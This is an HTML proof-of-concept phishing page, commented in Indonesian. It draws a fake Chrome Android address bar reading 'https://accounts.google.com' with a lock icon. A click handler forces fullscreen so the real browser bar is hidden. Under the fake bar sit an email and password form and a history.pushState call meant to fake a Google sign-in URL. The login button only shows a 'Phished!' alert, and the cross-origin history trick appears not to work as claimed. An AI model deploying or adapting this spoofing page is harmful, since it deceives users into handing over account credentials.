<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; font-family: sans-serif; height: 200vh; }
        
        /* Bar Palsu yang Mirip Chrome Android */
        #fake-bar {
            position: fixed;
            top: 0;
            width: 100%;
            height: 56px;
            background: #fff;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #ddd;
            z-index: 9999;
            padding: 0 16px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .url-box {
            background: #f1f3f4;
            border-radius: 20px;
            padding: 8px 16px;
            width: 80%;
            color: #202124;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        .lock-icon { margin-right: 8px; color: #1a73e8; }
    </style>
</head>
<body>

<div id="fake-bar">
    <div class="url-box">
        <span class="lock-icon">🔒</span>
        <strong>https://accounts.google.com</strong>
    </div>
</div>

<div style="padding-top: 80px; text-align: center;">
    <h1>Login to Continue</h1>
    <input type="email" placeholder="Email"><br><br>
    <input type="password" placeholder="Password"><br><br>
    <button onclick="alert('Phished!')">Login</button>
</div>

<script>
    // Trick: Paksa user berinteraksi untuk masuk fullscreen
    window.onclick = function() {
        document.documentElement.requestFullscreen();
        // Setelah fullscreen, bar asli Chrome akan sembunyi
        // User hanya akan melihat #fake-bar kita di paling atas
        console.log("[*] Fullscreen active. Fake bar deployed.");
    };

    // Trick Tambahan: Manipulasi History
    // Biar kalau user liat history, seolah-olah dia di google.com
    history.pushState(null, "", "https://accounts.google.com/signin/v2/identifier");
</script>

</body>
</html>
